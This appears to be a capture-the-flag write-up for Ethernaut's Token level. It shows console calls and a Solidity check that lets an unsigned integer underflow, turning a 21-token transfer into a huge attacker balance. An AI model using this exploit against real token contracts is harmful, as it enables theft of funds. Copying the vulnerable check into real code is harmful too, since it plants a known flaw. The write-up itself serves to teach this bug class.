The owner of the funds is not obvious:

```js
// 21000000
await contract.totalSupply()
// 0
await contract.balanceOf(ethernaut.address)
```

Upon inspection of the [transaction than spawns the level][level-spawn], we find the actual creator of the token contract:

```js
// 20999980
await contract.balanceOf('0x478f3476358eb166cb7ade4666d04fbddb56c407')
```

But there is no way to directly transfer tokens from the owner.

Instead, we'll exploit a flaw in the logic:

```solidity
// should be require(balances[msg.sender] >= _value);
require(balances[msg.sender] - _value >= 0);
```

`balances[msg.sender] - _value` is cast to `uint`: the expected negative value is encoded using the "two's complement" and is actually a large number.
This is known as an underflow.

So the check is always satisfied and the underflow will be triggered on the balance of the sender:

```solidity
balances[msg.sender] -= _value;
balances[_to] += _value;
```

If the recipient is the same as the sender, this operation is canceled out by the second statement.
In order to keep the underflowed balance, we can just send the tokens to any other address:

```js
await contract.transfer('0x478f3476358eb166cb7ade4666d04fbddb56c407', 21)
// 21000001
await contract.balanceOf('0x478f3476358eb166cb7ade4666d04fbddb56c407')
// [67108863, 67108863, 67108863, 67108863, 67108863, 67108863, 67108863, 67108863, 67108863, 4194303, null]
await contract.balanceOf(player)
````

[level-spawn]: https://dashboard.tenderly.co/tx/sepolia/0x6cc482dd08daec0f127d76b19554c8c508a51b6a07d88577224da8b9ebba413b?trace=0.0
